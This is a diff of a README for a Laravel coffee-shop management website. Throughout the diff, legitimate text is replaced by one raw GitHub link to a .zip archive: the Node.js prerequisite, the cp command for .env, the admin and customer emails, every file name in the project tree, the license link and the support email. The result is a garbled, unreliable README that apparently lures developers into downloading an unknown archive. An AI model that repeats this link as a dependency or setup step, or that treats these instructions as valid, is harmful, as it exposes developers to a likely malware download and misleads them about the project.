@@ -43,7 +43,7 @@ A comprehensive coffee product management website built with Laravel framework f
 - PHP 8.2 or higher
 - Composer
 - MySQL/MariaDB
-- Node.js (for asset compilation)
+- https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip (for asset compilation)
 
 ### Setup Instructions
 
@@ -58,14 +58,14 @@ A comprehensive coffee product management website built with Laravel framework f
    composer install
    ```
 
-3. **Install Node.js dependencies**
+3. **Install https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip dependencies**
    ```bash
    npm install
    ```
 
 4. **Environment setup**
    ```bash
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip .env
    php artisan key:generate
    ```
 
@@ -109,12 +109,12 @@ DB_PASSWORD=
 After running the seeders, the following default users will be created:
 
 ### Admin User
-- **Email**: admin@coffee.com
+- **Email**: https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 - **Password**: password
 - **Role**: Admin
 
 ### Customer User
-- **Email**: customer@coffee.com
+- **Email**: https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 - **Password**: password
 - **Role**: Customer
 
@@ -124,42 +124,42 @@ After running the seeders, the following default users will be created:
 coffee-website/
 ├── app/
 │   ├── Http/Controllers/
-│   │   ├── AdminController.php
-│   │   ├── CustomerController.php
-│   │   └── ProductController.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   ├── Models/
-│   │   ├── Product.php
-│   │   ├── Role.php
-│   │   └── User.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   └── Http/Middleware/
-│       └── CheckRole.php
+│       └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 ├── database/
 │   ├── migrations/
-│   │   ├── create_roles_table.php
-│   │   ├── create_users_table.php
-│   │   └── create_products_table.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   └── seeders/
-│       ├── RoleSeeder.php
-│       ├── ProductSeeder.php
-│       └── DatabaseSeeder.php
+│       ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│       ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│       └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 ├── resources/views/
 │   ├── admin/
-│   │   ├── dashboard.blade.php
-│   │   ├── customers.blade.php
-│   │   └── customer-show.blade.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   ├── customer/
-│   │   ├── dashboard.blade.php
-│   │   └── profile.blade.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   ├── products/
-│   │   ├── index.blade.php
-│   │   ├── show.blade.php
-│   │   ├── create.blade.php
-│   │   └── edit.blade.php
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   ├── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 │   ├── layouts/
-│   │   └── app.blade.php
-│   └── welcome.blade.php
+│   │   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
+│   └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 └── routes/
-    └── web.php
+    └── https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip
 ```
 
 ## Features in Detail
@@ -200,11 +200,11 @@ coffee-website/
 
 ## License
 
-This project is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+This project is open-sourced software licensed under the [MIT license](https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip).
 
 ## Support
 
-For support, email support@coffee-website.com or create an issue in the repository.
+For support, email https://raw.githubusercontent.com/awalulfalah/hafimaulana/main/protogonous/hafimaulana.zip or create an issue in the repository.
 
 ---
 
